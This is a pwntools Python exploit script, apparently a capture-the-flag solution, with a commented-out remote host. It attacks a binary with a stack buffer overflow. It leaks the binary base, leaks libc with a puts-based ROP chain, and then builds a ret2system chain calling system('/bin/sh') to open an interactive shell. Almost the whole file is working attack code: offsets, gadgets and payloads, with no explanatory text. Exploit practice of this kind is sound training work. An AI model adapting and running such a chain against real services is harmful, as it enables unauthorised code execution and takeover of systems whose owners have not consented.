#!/root/venvs/pwn/bin/python

from pwn import *

exe = ELF("app_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
# break main
break user_func
# brva 0x0000000000001232
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(exe.path)
	io.sendlineafter(b"name?", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	print(f"Located RIP offset at offset: {ip_offset}")
	io.shutdown()
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def leak_binary(value:bytes):
    io.sendlineafter(b"name?" , value)
    # input("Parse binary leak")
    b = io.recvlines()
    result = b[1][-7:-1]
    leak = result.ljust(8, b'\x00')
    leak = int(u64(leak))
    return leak
    
def leak_libc(value:bytes):
    io.sendlineafter(b"Whats your name?", value)
    b = io.recvlines()[3]
    leak = b.ljust(8, b'\x00')
    leak = int(u64(leak))
    return leak

def exploit(value:bytes):
    io.sendlineafter(b"Whats your name?", value)
    
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
ip_offset = 120
io = start_local(isDebug)

######## REMOTE ########
# HOST = "7443d542-46fe-4201-ab43-c27a5573e615.openec.sc"
# PORT = 31337
# io = remote(HOST, PORT, ssl=True, sni=HOST)
io.timeout = 0.4

#### LEAK BINARY ####
payload = flat(
    b"admin",
	b"a" * (ip_offset-5)
)

exe.address = leak_binary(payload) - 0x11a9
print(f"Binary base: {hex(exe.address)}")
#####################


#### LEAK LIBC ####
pop_rdi = exe.address + 0x0000000000001323 #: pop rdi; ret;
payload = flat(
	b"a" * (ip_offset),
	pop_rdi,
	exe.got.puts,
	exe.symbols['puts'],
	exe.symbols['main']
)

libc.address = leak_libc(payload) - 0x84420
print(f"libc base: {hex(libc.address)}")
#####################


#### Ret2System ####
bin_sh = next(libc.search(b"/bin/sh\0"))
ret_address = exe.address + 0x000000000000101a
payload = flat(
	b"a" * (ip_offset),
	pop_rdi,
	bin_sh,
	ret_address,
	libc.symbols['system']
)

exploit(payload)
#####################


io.interactive()
